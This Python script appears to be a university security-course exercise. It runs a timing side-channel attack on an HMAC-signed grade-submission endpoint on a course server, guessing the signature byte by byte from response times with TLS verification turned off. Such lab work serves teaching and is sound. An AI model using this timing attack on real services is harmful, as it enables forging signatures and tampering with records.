import time
import datetime
import urllib.request
import urllib.parse
import random
import requests
# import certifi
from string import ascii_letters, digits, ascii_uppercase,hexdigits

def keywithmaxval(d):
     v = list(d.values())
     k = list(d.keys())
     return k[v.index(max(v))]

# https://eitn41.eit.lth.se:3119/ha4/addgrade.php?name=Kalle&grade=5&signature=6823...ba36
#s = HMAC(name||grade, k),
def f(name, grade):
    sig = "" #6823ea50b133c58cba36
    requests.packages.urllib3.disable_warnings()
    url = "https://eitn41.eit.lth.se:3119/ha4/addgrade.php?"
    string = "0123456789abcdef"
    found = time.time()
    while len(sig) < 20:
        times = {}
        for i in range(len(string)):
            R = sig + string[i]
            payload = {'name': name, 'grade': grade, 'signature':R}
            r = requests.get(url, params=payload, verify=False)
            r_time = r.elapsed.total_seconds()
            times[R] = r_time
        sig = keywithmaxval(times)
    payload = {'name': name, 'grade': grade, 'signature':"6823ea50b133c58cba36"}
    r = requests.get(url, params=payload, verify=False)
    print(r.text)
    print(sig)

f("Kalle", 5)
